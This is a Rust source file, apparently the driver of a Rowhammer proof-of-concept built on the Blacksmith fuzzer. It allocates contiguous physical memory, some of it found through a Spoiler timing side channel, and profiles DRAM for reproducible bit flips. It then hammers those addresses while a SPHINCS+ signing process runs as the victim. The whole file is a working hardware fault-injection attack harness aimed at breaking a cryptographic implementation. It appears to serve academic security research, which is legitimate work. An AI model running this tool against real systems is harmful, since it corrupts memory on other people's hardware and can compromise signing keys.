use std::{
    fs::File,
    io::{stdin, BufReader, BufWriter, Write},
    ops::Range,
    time::Duration,
};

use anyhow::bail;
use bs_poc::hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper};
use bs_poc::hammerer::Hammering;
use bs_poc::memory::{mem_configuration::MemConfiguration, GetConsecPfns};
use bs_poc::{
    allocator::hugepage::HugepageAllocator,
    hammerer::{make_hammer, HammerResult, HammerStrategy},
    memory::{BitFlip, DataPattern, Initializable},
    victim::{HammerVictimError, VictimResult},
};
use bs_poc::{
    allocator::{self, BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap, Pfn},
    memory::ConsecCheck,
    victim,
};
use bs_poc::{
    allocator::{CoCo, HugepageRandomized, Spoiler},
    hammerer::Hammerer,
};
use bs_poc::{hammerer::blacksmith::blacksmith_config::BlacksmithConfig, victim::HammerVictim};
use bs_poc::{
    memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming},
    retry,
    util::init_logging_with_progress,
};
use clap::{Parser, Subcommand};
use indicatif::{MultiProgress, ProgressBar};
use itertools::Itertools;
use log::{info, warn};
use rand::{rngs::StdRng, SeedableRng};
use serde::Serialize;

/// CLI arguments for the `hammer` binary.
///
/// This struct defines the command line arguments that can be passed to the `hammer` binary.
#[derive(Debug, Parser, Serialize)]
struct CliArgs {
    ///The `blacksmith` config file.
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load.
    #[clap(long = "load-json", default_value = "config/fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the `blacksmith` JSON file.
    #[clap(
        long = "pattern",
        default_value = "39ad622b-3bfe-4161-b860-dad5f3e6dd68"
    )]
    pattern: Option<String>,
    /// The mapping ID to load from the `blacksmith` JSON file. Optional argument, will determine most optimal pattern if omitted.
    #[clap(long = "mapping")]
    mapping: Option<String>,
    /// The allocation strategy to use.
    #[clap(long = "alloc-strategy", default_value = "spoiler")]
    alloc_strategy: AllocStrategy,
    /// The hammering strategy to use.
    #[clap(long = "hammerer", default_value = "blacksmith")]
    hammerer: HammerStrategy,
    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
    /// A repetition denotes a complete run of the suite:
    /// 1. allocate memory using the requested `alloc-strategy`
    /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
    /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
    /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
    #[arg(long, conflicts_with = "timeout")]
    repeat: Option<Option<usize>>,
    /// The timeout in seconds for the hammering process. The default is `None`, causing the hammering process to run indefinitely.
    #[arg(long, conflicts_with = "repeat")]
    timeout: Option<u64>,
    /// The number of rounds to profile for vulnerable addresses.
    /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
    #[arg(long, default_value = "1")]
    profiling_rounds: u64,
    /// The number of hammering attempts per round.
    /// An attempt denotes a single run of the hammering code. Usually, hammerers need several attempts to successfully flip a bit in the victim.
    /// The default value of 100 is a good starting point for the blacksmith hammerer.
    #[arg(long, default_value = "100")]
    attempts: u32,
    /// Do a stats run. This will run the hammerer and store the results in the provided file. The default is `None`, causing no stats to be stored.
    /// When `stats` is set, the hammering process will not exit after the first successful attack, but continue hammering until `repeat` is reached.
    #[arg(long)]
    statistics: Option<String>,
    /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
    #[command(subcommand)]
    target: Option<Target>,
}

#[derive(Clone, Debug, Subcommand, Serialize)]
enum Target {
    SphincsPlus { binary: String },
    None,
}

/// The type of allocation strategy to use.
#[derive(clap::ValueEnum, Clone, Debug, Serialize)]
pub enum AllocStrategy {
    /// Use `/proc/buddyinfo` to monitor availability of page orders, assume consecutive memory according to the delta in buddyinfo.
    BuddyInfo,
    // Allocate using the CoCo dec mem module: https://git.its.uni-luebeck.de/research-projects/tdx/kmod-coco-dec-mem
    CoCo,
    /// Allocate consecutive memory using huge pages.
    Hugepage,
    /// Allocate consecutive memory using huge pages with randomization. This will return random 4 MB chunks of a 1 GB hugepage.
    HugepageRnd,
    /// Allocate consecutive memory using `bank timing`. This will `mmap` a large buffer and find consecutive memory using bank timing check
    BankTiming,
    /// Allocate a large block of memory and use pagemap to find consecutive blocks
    Pfn,
    /// Allocate consecutive memory using the Spoiler attack. This strategy will measure read-after-write pipeline conflicts to determine consecutive memory.
    Spoiler,
}

impl AllocStrategy {
    fn create_allocator(
        &self,
        mem_config: MemConfiguration,
        conflict_threshold: u64,
        progress: Option<MultiProgress>,
    ) -> allocator::ConsecAlloc {
        match self {
            AllocStrategy::BuddyInfo => ConsecAlloc::BuddyInfo(BuddyInfo::new(
                ConsecCheck::BankTiming(ConsecCheckBankTiming::new(mem_config, conflict_threshold)),
            )),
            AllocStrategy::CoCo => ConsecAlloc::CoCo(CoCo {}),
            AllocStrategy::BankTiming => ConsecAlloc::Mmap(Mmap::new(
                ConsecCheck::BankTiming(ConsecCheckBankTiming::new(mem_config, conflict_threshold)),
                progress,
            )),
            AllocStrategy::Hugepage => ConsecAlloc::Hugepage(HugepageAllocator::default()),
            AllocStrategy::HugepageRnd => ConsecAlloc::HugepageRnd(HugepageRandomized::new(1)),
            AllocStrategy::Pfn => ConsecAlloc::Pfn(Pfn::new(mem_config)),
            AllocStrategy::Spoiler => ConsecAlloc::Spoiler(Box::new(Spoiler::new(
                mem_config,
                conflict_threshold,
                progress,
            ))),
        }
    }
}

fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let fuzz: FuzzSummary = serde_json::from_reader(reader)?;
    let pattern = retry!(|| {
        println!("Please choose a pattern:");
        for (i, pattern) in fuzz.hammering_patterns.iter().enumerate() {
            let best_mapping = pattern
                .determine_most_effective_mapping()
                .expect("no mappings");
            println!(
                "{}: {} (best mapping {} with {} flips)",
                i,
                pattern.id,
                best_mapping.id,
                best_mapping.count_bitflips()
            )
        }
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Did not enter a correct string");
        match str::parse::<usize>(option.trim()) {
            Ok(i) => {
                if i < fuzz.hammering_patterns.len() {
                    return Ok(fuzz.hammering_patterns[i].id.clone());
                }
                bail!(
                    "Invalid pattern index {}/{}",
                    i,
                    fuzz.hammering_patterns.len()
                );
            }
            Err(e) => Err(e.into()),
        }
    });
    Ok(pattern)
}

struct LoadedPattern {
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
}

fn load_pattern(args: &CliArgs) -> anyhow::Result<LoadedPattern> {
    // load patterns from JSON
    let pattern = match &args.pattern {
        Some(pattern) => pattern.clone(),
        None => cli_ask_pattern(args.load_json.clone())?,
    };

    let pattern = HammeringPattern::load_pattern_from_json(args.load_json.clone(), pattern)?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {}", mapping.id);
    let max_flips = mapping.count_bitflips();
    info!("Max flips: {:?}", max_flips);
    if max_flips == 0 {
        bail!("No flips in mapping");
    }
    info!("Flips in mapping: {:?}", &mapping.bit_flips);
    Ok(LoadedPattern { pattern, mapping })
}

#[derive(Debug)]
struct RoundProfile {
    bit_flips: Vec<BitFlip>,
    pattern: DataPattern,
    duration: Duration,
}

type Profiling = Vec<RoundProfile>;

const MIN_REPRO_FRAC: f64 = 0.8;

/// Hammer a given `memory` region `num_rounds` times to profile for vulnerable addresses.
fn hammer_profile(
    hammerer: &Hammerer,
    memory: &ConsecBlocks,
    num_rounds: u64,
    progress: Option<MultiProgress>,
) -> Profiling {
    let p = progress
        .as_ref()
        .map(|p| p.add(ProgressBar::new(num_rounds * 3)));
    let mut rounds = vec![];

    for pattern in [
        //DataPattern::StripeZero(aggressors.clone()),
        //DataPattern::StripeOne(aggressors.clone()),
        DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
        DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
        DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
    ] {
        let mut no_flips_rounds = 0;
        for _ in 0..num_rounds {
            if let Some(p) = p.as_ref() {
                p.inc(1)
            }
            if no_flips_rounds > ((1_f64 - MIN_REPRO_FRAC) * num_rounds as f64) as usize {
                warn!(
                    "No flips detected in {} rounds. Stopping profiling, continuing with next pattern",
                    no_flips_rounds
                );
                return rounds;
            }
            let start = std::time::Instant::now();
            let mut victim = victim::MemCheck::new(memory, pattern.clone());
            let result = hammerer.hammer(&mut victim);
            let duration = std::time::Instant::now() - start;
            let bit_flips = match result {
                Ok(result) => {
                    info!(
                        "Profiling hammering round successful at attempt {}: {:?}",
                        result.attempt, result.victim_result
                    );
                    result.victim_result.bit_flips()
                }
                Err(e) => {
                    warn!("Profiling hammering round not successful: {:?}", e);
                    vec![]
                }
            };
            if bit_flips.is_empty() {
                no_flips_rounds += 1;
            }
            rounds.push(RoundProfile {
                bit_flips,
                pattern: pattern.clone(),
                duration,
            });
        }
    }
    rounds
}

type ExperimentError = String;

#[derive(Serialize)]
struct ExperimentData<T, E> {
    date: String,
    result: Result<T, E>,
}

impl<T, E> ExperimentData<T, E> {
    fn error(error: E) -> Self {
        Self {
            date: chrono::Local::now().to_rfc3339(),
            result: Err(error),
        }
    }
    fn success(result: T) -> Self {
        Self {
            date: chrono::Local::now().to_rfc3339(),
            result: Ok(result),
        }
    }
}

unsafe fn _main() -> anyhow::Result<()> {
    let progress = init_logging_with_progress()?;

    // parse args
    let args = CliArgs::parse();

    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&config);
    let pattern = load_pattern(&args)?;

    info!("Args: {:?}", args);

    let mut alloc_strategy =
        args.alloc_strategy
            .create_allocator(mem_config, config.threshold, Some(progress.clone()));
    let block_size = alloc_strategy.block_size();

    let repetitions = match (args.timeout, args.repeat) {
        (None, Some(Some(repeat))) => repeat,
        (None, Some(None)) | (Some(_), None) => usize::MAX,
        (None, None) => 1,
        (Some(_), Some(_)) => bail!("Cannot specify both --timeout and --repeat"),
    };

    let timeout = args.timeout.map(|t| Duration::from_secs(t * 60));

    let start = std::time::Instant::now();

    #[derive(Serialize)]
    struct HammerStatistic {
        alloc_duration_millis: u128,
        memory_regions: Vec<Range<u64>>,
        hammer_durations_millis: Vec<u128>,
        bit_flips: Vec<Vec<BitFlip>>,
    }
    let mut stats = vec![];

    let mut results: Vec<ExperimentData<HammerResult, ExperimentError>> = vec![];
    'repeat: for _ in 0..repetitions {
        if let Some(timeout) = timeout {
            if std::time::Instant::now() - start > timeout {
                break;
            }
        }
        info!("Starting bait allocation");
        let start = std::time::Instant::now();
        let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
        let alloc_duration = std::time::Instant::now() - start;
        info!("Allocated {} bytes of memory", memory.len());

        info!("Profiling memory for vulnerable addresses");
        info!(
            "Expecting bitflips at {:?}",
            pattern
                .mapping
                .get_bitflips_relocate(mem_config, block_size.ilog2() as usize, &memory)
        );
        let profile_hammer = make_hammer(
            &args.hammerer,
            &pattern.pattern,
            &pattern.mapping,
            mem_config,
            block_size,
            &memory,
            args.attempts,
            true,
            None,
        )?;
        let profiling = hammer_profile(&profile_hammer, &memory, 10, Some(progress.clone()));
        // write stats
        if let Some(stats_file) = &args.statistics {
            stats.push(HammerStatistic {
                alloc_duration_millis: alloc_duration.as_millis(),
                memory_regions: memory.consec_pfns().unwrap_or_default(),
                hammer_durations_millis: profiling.iter().map(|r| r.duration.as_millis()).collect(),
                bit_flips: profiling
                    .iter()
                    .map(|r| r.bit_flips.clone())
                    .collect::<Vec<_>>()
                    .clone(),
            });
            info!(
                "Writing statistics to file {}",
                args.statistics.as_ref().unwrap()
            );
            let mut json_file = BufWriter::new(File::create(stats_file)?);
            serde_json::to_writer_pretty(&mut json_file, &stats)?;
            json_file.flush()?;
        }
        // filter for reproducible flips
        // TODO refactor into hammer_profile
        let profiling = profiling
            .iter()
            .group_by(|p| p.pattern.clone())
            .into_iter()
            .filter_map(|(pattern, profiles)| {
                let profiles = profiles.collect_vec();
                let num_profiles = profiles.len();
                let flips = profiles
                    .iter()
                    .flat_map(|p| p.bit_flips.clone())
                    .unique_by(|f| f.addr)
                    .collect_vec();
                let mut flips_repro = vec![];
                for flip in flips {
                    let mut repro = 0;
                    // find flip in other profiles
                    for profile in profiles.clone() {
                        if profile.bit_flips.contains(&flip) {
                            repro += 1;
                        }
                    }
                    info!(
                        "Candidate: 0x{:x} reproducible {}/{}",
                        flip.addr, repro, num_profiles
                    );
                    if repro >= (num_profiles as f64 * 0.8).round() as usize {
                        info!("Accept flip 0x{:x} as reproducible", flip.addr);
                        flips_repro.push(flip)
                    }
                }
                if !flips_repro.is_empty() {
                    Some((
                        pattern.clone(),
                        RoundProfile {
                            bit_flips: flips_repro,
                            pattern,
                            duration: Duration::default(),
                        },
                    ))
                } else {
                    None
                }
            })
            .collect_vec();
        if profiling.is_empty() {
            warn!("No vulnerable addresses found");
            memory.dealloc();
            results.push(ExperimentData::error(
                "No vulnerable addresses found".to_string(),
            ));
            continue;
        } else {
            info!("Profiling done. Found {:?}", profiling);
        }

        let addrs = profiling
            .iter()
            .flat_map(|(_, prof)| prof.bit_flips.iter().map(|f| f.addr))
            .collect_vec();

        let mut victim = match make_victim(args.target.clone().unwrap_or(Target::None), addrs) {
            Ok(victim) => victim,
            Err(e) => {
                results.push(e);
                memory.dealloc();
                continue 'repeat;
            }
        };

        let dpattern = profiling
            .iter()
            .find(|(_, prof)| {
                prof.bit_flips
                    .iter()
                    .any(|b| b.addr == victim.target_addr() as usize)
            })
            .map(|(pat, _)| pat.clone())
            .expect("no round with flips in addr");

        memory.initialize(dpattern);
        match victim.start() {
            Ok(_) => {}
            Err(e) => {
                warn!("Failed to start victim: {:?}", e);
                memory.dealloc();
                results.push(ExperimentData::error(format!(
                    "Failed to start victim: {:?}",
                    e
                )));
                continue 'repeat;
            }
        }
        let hammer = make_hammer(
            &args.hammerer,
            &pattern.pattern,
            &pattern.mapping,
            mem_config,
            block_size,
            &memory,
            args.attempts,
            false,
            None,
        )?;
        for _ in 0..10 {
            let result = hammer.hammer(&mut victim);
            match result {
                Ok(result) => {
                    info!("Hammering successful: {:?}", result.victim_result);
                    results.push(ExperimentData::success(result));
                }
                Err(HammerVictimError::NoFlips) => {
                    warn!("No flips detected");
                    results.push(ExperimentData::error("No flips detected".to_string()));
                }
                Err(e) => {
                    warn!("Hammering failed: {:?}", e);
                    results.push(ExperimentData::error(format!("Hammering failed: {:?}", e)));
                    break;
                }
            }
        }
        victim.stop();
        memory.dealloc();
    }
    let now = chrono::Local::now().format("%Y-%m-%d_%H-%M-%S").to_string();
    let results_file = format!("results_{}.json", now);
    info!(
        "Timeout reached. Writing experiment results to file {}.",
        results_file
    );
    #[derive(Serialize)]
    struct ExperimentResult {
        args: CliArgs,
        results: Vec<ExperimentData<HammerResult, ExperimentError>>,
    }
    let res = ExperimentResult { args, results };
    let mut json_file = BufWriter::new(File::create(results_file)?);
    serde_json::to_writer_pretty(&mut json_file, &res)?;
    json_file.flush()?;
    Ok(())
}

#[allow(clippy::result_large_err)]
fn make_victim(
    target: Target,
    addrs: Vec<usize>,
) -> Result<Victim, ExperimentData<HammerResult, ExperimentError>> {
    match target {
        Target::SphincsPlus { binary } => Ok(Victim::SphincsPlus(
            victim::SphincsPlus::new(binary, addrs).map_err(|e| {
                warn!("Failed to create victim: {}", e);
                ExperimentData::error(format!("Failed to create victim: {}", e))
            })?,
        )),
        Target::None => Err(ExperimentData::error("No target specified".to_string())),
    }
}

#[derive(Serialize)]
enum Victim {
    SphincsPlus(victim::SphincsPlus),
}
impl Victim {
    // TODO refactor to trait
    fn target_addr(&self) -> *const libc::c_void {
        match self {
            Victim::SphincsPlus(v) => v.target_addr(),
        }
    }
}

impl HammerVictim for Victim {
    fn start(&mut self) -> Result<(), HammerVictimError> {
        match self {
            Victim::SphincsPlus(v) => v.start(),
        }
    }

    fn init(&mut self) {
        match self {
            Victim::SphincsPlus(v) => v.init(),
        }
    }

    fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
        match self {
            Victim::SphincsPlus(v) => v.check(),
        }
    }

    fn stop(&mut self) {
        match self {
            Victim::SphincsPlus(v) => v.stop(),
        }
    }
}

fn main() -> anyhow::Result<()> {
    unsafe { _main() }
}
